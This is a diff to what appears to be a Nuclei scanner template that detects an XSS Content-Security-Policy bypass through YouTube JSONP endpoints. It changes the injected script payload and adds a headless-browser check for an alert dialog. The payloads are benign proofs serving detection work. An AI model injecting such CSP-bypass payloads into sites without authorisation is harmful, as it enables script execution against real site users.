@@ -1,12 +1,11 @@
 id: youtube-csp-xss
 
 info:
-  name: Content-Security-Policy Bypass via Youtube
-  author: DhiyaneshDK
-  severity: high
+  name: Content-Security-Policy Bypass via YouTube
+  author: renniepak,DhiyaneshDK
+  severity: medium
   reference:
-    - https://infosecwriteups.com/riding-the-waves-of-api-versioning-unmasking-a-stored-xss-vulnerability-bypassing-csp-using-c039c10df2b1
-    - https://github.com/renniepak/CSPBypass/blob/0b4c8aee52497d660adce7a6d67311a73383818c/data.tsv#L206C17-L206C89
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
   metadata:
     verified: true
   tags: xss,csp-bypass,youtube
@@ -19,14 +18,14 @@ http:
 
     payloads:
       injection:
-        - '<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>'
+        - '<script src="https://www.youtube.com/iframe_api?callback=alert"></script>'
 
     fuzzing:
       - part: query
         type: replace
         mode: single
         fuzz:
-          - "{{injection}}"
+          - "{{url_encode(injection)}}"
 
     matchers-condition: and
     matchers:
@@ -34,15 +33,23 @@ http:
         part: body
         words:
           - "{{injection}}"
+        internal: true
 
-      - type: word
-        part: content_type
-        words:
-          - "text/html"
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{RootURL}}{{trim_prefix(http_matched, RootURL)}}"
 
-      - type: word
-        part: content_security_policy
-        words:
-          - "www.youtube.com"
-          - "script-src"
-        condition: and
+      - action: waitload
+
+      - action: waitdialog
+        name: youtube_csp_xss
+        args:
+          type: alert
+          timeout: 5000
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "youtube_csp_xss == true" 
